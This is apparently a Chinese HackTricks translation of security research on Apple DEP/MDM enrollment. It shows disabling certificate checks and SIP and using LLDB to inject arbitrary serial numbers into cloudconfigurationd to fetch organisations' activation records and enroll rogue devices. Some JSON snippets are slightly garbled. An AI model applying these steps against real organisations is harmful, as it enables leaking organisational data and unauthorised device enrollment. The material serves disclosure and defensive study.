# 将设备注册到其他组织

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 简介

正如[**之前提到的**](./#what-is-mdm-mobile-device-management)**，为了尝试将设备注册到一个组织中，只需要一个属于该组织的序列号**。一旦设备注册成功，多个组织将在新设备上安装敏感数据：证书、应用程序、WiFi密码、VPN配置等等。因此，如果注册过程没有得到正确的保护，这可能成为攻击者的危险入口。

**以下研究内容来自**[**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe)

## 反向工程过程

### DEP和MDM中涉及的二进制文件

在我们的研究中，我们探索了以下内容：

* **`mdmclient`**：操作系统用于与MDM服务器通信的工具。在macOS 10.13.3及更早版本中，它还可以用于触发DEP签入。
* **`profiles`**：一个实用工具，可用于在macOS上安装、删除和查看配置文件。在macOS 10.13.4及更高版本中，它还可以用于触发DEP签入。
* **`cloudconfigurationd`**：设备注册客户端守护程序，负责与DEP API通信并检索设备注册配置文件。

使用`mdmclient`或`profiles`来启动DEP签入时，将使用`CPFetchActivationRecord`和`CPGetActivationRecord`函数来检索_激活记录_。`CPFetchActivationRecord`通过[XPC](https://developer.apple.com/documentation/xpc)将控制权委托给`cloudconfigurationd`，然后从DEP API检索_激活记录_。

`CPGetActivationRecord`从缓存中检索_激活记录_（如果有）。这些函数定义在私有的配置文件框架中，位于`/System/Library/PrivateFrameworks/Configuration Profiles.framework`。

### 反向工程Tesla协议和Absinthe方案

在DEP签入过程中，`cloudconfigurationd`从_iprofiles.apple.com/macProfile_请求一个_激活记录_。请求的有效负载是一个包含两个键值对的JSON字典：
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
负载使用内部称为“Absinthe”的方案进行签名和加密。加密的负载然后进行Base 64编码，并用作HTTP POST请求中的请求体，发送到_iprofiles.apple.com/macProfile_。

在`cloudconfigurationd`中，获取“激活记录”由`MCTeslaConfigurationFetcher`类处理。从`[MCTeslaConfigurationFetcher enterState:]`开始的一般流程如下：
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
由于**Absinthe**方案似乎用于对DEP服务进行身份验证的请求，**逆向工程**该方案将使我们能够自己对DEP API进行身份验证的请求。然而，这证明是非常**耗时**的，主要是因为身份验证请求涉及的步骤很多。我们选择探索其他方法来在_Activation Record_请求中插入任意序列号，而不是完全逆向这个方案的工作原理。

### MITM拦截DEP请求

我们尝试使用[Charles Proxy](https://www.charlesproxy.com)代理网络请求到_iprofiles.apple.com_，目标是检查发送到_iprofiles.apple.com/macProfile_的有效载荷，然后插入一个任意的序列号并重新发送请求。如前所述，由`cloudconfigurationd`提交到该端点的有效载荷采用[JSON](https://www.json.org)格式，包含两个键值对。
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
由于_iprofiles.apple.com_上的API使用[传输层安全性](https://en.wikipedia.org/wiki/Transport\_Layer\_Security)（TLS），我们需要在Charles中启用SSL代理以查看SSL请求的明文内容。

然而，`-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]`方法会检查服务器证书的有效性，如果无法验证服务器信任，则会中止。
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
上面显示的错误消息位于二进制文件_Errors.strings_中，其键名为`CLOUD_CONFIG_SERVER_TRUST_ERROR`，该文件位于`/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`，与其他相关的错误消息一起。
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
可以使用内置的`plutil`命令将_Errors.strings_文件以人类可读的格式[打印出来](https://duo.com/labs/research/mdm-me-maybe#error\_strings\_output)。
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
在进一步研究`MCTeslaConfigurationFetcher`类后，我们发现可以通过在`com.apple.ManagedClient.cloudconfigurationd`首选项域上启用`MCCloudConfigAcceptAnyHTTPSCertificate`配置选项来绕过此服务器信任行为。
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
`MCCloudConfigAcceptAnyHTTPSCertificate`配置选项可以使用`defaults`命令进行设置。
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
启用SSL代理以用于_iprofiles.apple.com_，并配置`cloudconfigurationd`以接受任何HTTPS证书，我们尝试在Charles Proxy中进行中间人攻击并重放请求。

然而，由于包含在HTTP POST请求的正文中的有效负载是使用Absinthe（`NACSign`）进行签名和加密的，**无法修改明文JSON有效负载以包含任意序列号，而不具备解密密钥**。虽然可以通过获取密钥来解密有效负载，因为密钥仍然保存在内存中，但我们转而使用[LLDB](https://lldb.llvm.org)调试器来探索`cloudconfigurationd`。

### 对与DEP交互的系统二进制文件进行仪器化

我们探索的最后一种自动化向_iprofiles.apple.com/macProfile_提交任意序列号的方法是对直接或间接与DEP API交互的本机二进制文件进行仪器化。这涉及到在[Hopper v4](https://www.hopperapp.com)和[Ida Pro](https://www.hex-rays.com/products/ida/)中对`mdmclient`、`profiles`和`cloudconfigurationd`进行一些初步探索，并与`lldb`进行一些漫长的调试会话。

与修改二进制文件并使用我们自己的密钥重新签名相比，这种方法的一个好处是它绕过了内置在macOS中可能阻止我们的某些权限限制。

**系统完整性保护**

为了对macOS上的系统二进制文件（如`cloudconfigurationd`）进行仪器化，必须禁用[系统完整性保护](https://support.apple.com/en-us/HT204899)（SIP）。SIP是一种安全技术，用于保护系统级文件、文件夹和进程免受篡改，它在OS X 10.11“El Capitan”及更高版本中默认启用。可以通过进入恢复模式并在终端应用程序中运行以下命令，然后重新启动来禁用[SIP](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System\_Integrity\_Protection\_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html)：
```
csrutil enable --without debug
```
值得注意的是，SIP是一个有用的安全功能，除非用于非生产机器的研究和测试目的，否则不应禁用。在非关键的虚拟机上进行此操作是可能的（也是推荐的），而不是在主机操作系统上进行。

**使用LLDB进行二进制仪器化**

在禁用SIP后，我们可以继续对与DEP API交互的系统二进制文件进行仪器化，即`cloudconfigurationd`二进制文件。由于`cloudconfigurationd`需要提升的特权才能运行，我们需要使用`sudo`启动`lldb`。
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
当`lldb`等待时，我们可以在另一个终端窗口中运行`sudo /usr/libexec/mdmclient dep nag`来连接到`cloudconfigurationd`。一旦连接成功，将显示类似以下的输出，并可以在提示符处输入LLDB命令。
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**设置设备序列号**

在反向工程`mdmclient`和`cloudconfigurationd`时，我们首先查找的是负责检索系统序列号的代码，因为我们知道序列号最终用于设备的身份验证。我们的目标是在从[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)检索到序列号后，在内存中修改该序列号，并在`cloudconfigurationd`构建`macProfile`负载时使用。

尽管`cloudconfigurationd`最终负责与DEP API通信，但我们还研究了系统序列号是否直接在`mdmclient`中检索或使用。如下所示检索到的序列号并不是发送到DEP API的内容，但它揭示了一个硬编码的序列号，如果启用了特定的配置选项，则会使用该序列号。
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
系统序列号是从[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)中检索的，除非`sub_10002000f`的返回值为非零，此时它将设置为静态字符串“2222XXJREUF”。在检查该函数时，它似乎会检查是否启用了“服务器压力测试模式”。
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
我们记录了“服务器压力测试模式”的存在，但没有进一步探索，因为我们的目标是修改提交给DEP API的序列号。相反，我们测试了修改`r14`寄存器指向的序列号是否足以检索到不适用于我们正在测试的机器的“激活记录”。

接下来，我们研究了在`cloudconfigurationd`中如何检索系统序列号。
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
如上所示，序列号也可以从`cloudconfigurationd`中的[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)中检索到。

使用`lldb`，我们可以通过设置`IOServiceGetMatchingService`的断点，并创建一个包含任意序列号的新字符串变量，然后将`r14`寄存器重写为指向我们创建的变量的内存地址，从而修改从[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)中检索到的序列号。
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
虽然我们成功修改了从[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)中检索到的序列号，但`macProfile`负载仍然包含系统序列号，而不是我们写入`r14`寄存器的序列号。

**漏洞利用：在JSON序列化之前修改配置请求字典**

接下来，我们尝试以不同的方式设置发送到`macProfile`负载中的序列号。这次，我们不是修改通过[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)检索到的系统序列号，而是试图找到在使用Absinthe（`NACSign`）签名之前，序列号仍然以明文形式存在的代码中最接近的点。最好的查看点似乎是`-[MCTeslaConfigurationFetcher startConfigurationFetch]`，大致执行以下步骤：

* 创建一个新的`NSMutableData`对象
* 调用`[MCTeslaConfigurationFetcher setConfigurationData:]`，将新的`NSMutableData`对象传递给它
* 调用`[MCTeslaConfigurationFetcher profileRequestDictionary]`，返回一个包含两个键值对的`NSDictionary`对象：
* `sn`：系统序列号
* `action`：要执行的远程操作（以`sn`作为参数）
* 调用`[NSJSONSerialization dataWithJSONObject:]`，将`profileRequestDictionary`中的`NSDictionary`传递给它
* 使用Absinthe（`NACSign`）对JSON负载进行签名
* 对签名后的JSON负载进行Base64编码
* 将HTTP方法设置为`POST`
* 将HTTP正文设置为Base64编码的签名JSON负载
* 将`X-Profile-Protocol-Version` HTTP头设置为`1`
* 将`User-Agent` HTTP头设置为`ConfigClient-1.0`
* 使用`[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]`方法执行HTTP请求

然后，我们修改了从`profileRequestDictionary`返回的`NSDictionary`对象，在转换为JSON之前。为此，在`dataWithJSONObject`上设置了一个断点，以尽可能接近尚未转换的数据。断点成功触发，当我们打印寄存器的内容时，通过反汇编（`rdx`）我们知道我们得到了预期的结果。
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
上面是`[MCTeslaConfigurationFetcher profileRequestDictionary]`返回的`NSDictionary`对象的漂亮打印表示。我们接下来的挑战是修改包含序列号的内存中的`NSDictionary`。
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
上面的列表执行以下操作：

* 为`dataWithJSONObject`选择器创建一个正则表达式断点
* 等待`cloudconfigurationd`进程启动，然后附加到它
* 继续执行程序（因为我们第一个遇到的`dataWithJSONObject`断点不是在`profileRequestDictionary`上调用的）
* 创建并打印（由于`/x`，以十六进制格式）创建我们任意的`NSDictionary`的结果
* 由于我们已经知道所需键的名称，我们可以将序列号设置为我们选择的`sn`，并保持`action`不变
* 创建这个新`NSDictionary`的打印结果告诉我们，在特定的内存位置上有两个键值对

我们的最后一步是重复相同的步骤，将我们自定义的包含所选序列号的`NSDictionary`对象的内存位置写入`rdx`：
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
这将`rdx`寄存器指向我们新创建的`NSDictionary`，在将其序列化为[JSON](https://www.json.org)并`POST`到_iprofiles.apple.com/macProfile_之前，程序流程将`continue`。

在将配置文件请求字典序列化为JSON之前，修改序列号的方法有效。当使用已知的DEP注册的Apple序列号而不是(null)时，`ManagedClient`的调试日志显示了设备的完整DEP配置文件：
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
通过几个`lldb`命令，我们可以成功插入任意序列号并获取包含各种组织特定数据的DEP配置文件，包括组织的MDM注册URL。如前所述，现在我们知道设备的序列号，可以使用此注册URL来注册一个恶意设备。其他数据可以用于社会工程学攻击注册恶意设备。一旦注册成功，设备可以接收任意数量的证书、配置文件、应用程序、VPN配置等。

### 使用Python自动化`cloudconfigurationd`的仪器化

一旦我们有了初步的概念证明，即仅使用序列号就可以检索到有效的DEP配置文件，我们开始自动化这个过程，以展示攻击者如何滥用这个身份验证的弱点。

幸运的是，LLDB API可以通过Python的[脚本桥接接口](https://lldb.llvm.org/python-reference.html)来使用。在安装了[Xcode命令行工具](https://developer.apple.com/download/more/)的macOS系统上，可以按以下方式导入`lldb` Python模块：
```
import lldb
```
这使得我们相对容易地编写了一个概念验证脚本，演示了如何插入一个已注册的DEP序列号并获得有效的DEP配置文件作为返回。我们开发的概念验证脚本接受一个以换行符分隔的序列号列表，并将它们注入到`cloudconfigurationd`进程中以检查DEP配置文件。

![Charles SSL代理设置。](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![DEP通知。](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### 影响

苹果的设备注册计划存在多种滥用情况，可能导致组织的敏感信息被泄露。最明显的两种情况是获取设备所属组织的信息，这些信息可以从DEP配置文件中获取。第二种情况是利用这些信息进行恶意的DEP和MDM注册。下面将进一步讨论每种情况。

#### 信息泄露

如前所述，DEP注册过程的一部分涉及从DEP API请求和接收一个“激活记录”（或DEP配置文件）。通过提供一个有效的、已注册的DEP系统序列号，我们能够检索到以下信息（根据macOS版本，可以打印到`stdout`或写入到`ManagedClient`日志中）。
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
尽管某些组织的一些信息可能是公开的，但拥有组织拥有的设备的序列号以及从DEP配置文件中获取的信息可能会被用于针对组织的帮助台或IT团队进行各种社会工程攻击，例如请求重置密码或帮助将设备注册到公司的MDM服务器中。

#### 伪造DEP注册

[Apple MDM协议](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf)支持 - 但不要求 - 在通过[HTTP基本身份验证](https://en.wikipedia.org/wiki/Basic\_access\_authentication)进行MDM注册之前进行用户身份验证。**在没有身份验证的情况下，只需要一个有效的、DEP注册的序列号就可以将设备注册到MDM服务器中**。因此，攻击者如果获得这样的序列号（通过[OSINT](https://en.wikipedia.org/wiki/Open-source\_intelligence)、社会工程或暴力破解），就能够将自己的设备注册为组织拥有的设备，只要该设备当前没有在MDM服务器中注册。实质上，如果攻击者能够在真实设备之前发起DEP注册，他们就能够扮演该设备的身份。

组织可以 - 也确实这样做 - 利用MDM来部署敏感信息，如设备和用户证书、VPN配置数据、注册代理、配置文件和各种其他内部数据和组织机密。此外，一些组织选择在MDM注册中不要求用户进行身份验证。这样做有各种好处，例如更好的用户体验，以及不必将内部身份验证服务器暴露给MDM服务器以处理在企业网络之外进行的MDM注册（https://docs.simplemdm.com/article/93-ldap-authentication-with-apple-dep）。

然而，当利用DEP引导MDM注册时，这就带来了一个问题，因为攻击者将能够将自己选择的任何终端设备注册到组织的MDM服务器中。此外，一旦攻击者成功将自己选择的终端设备注册到MDM中，他们可能获得特权访问权限，可以用于在网络中进一步扩展。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
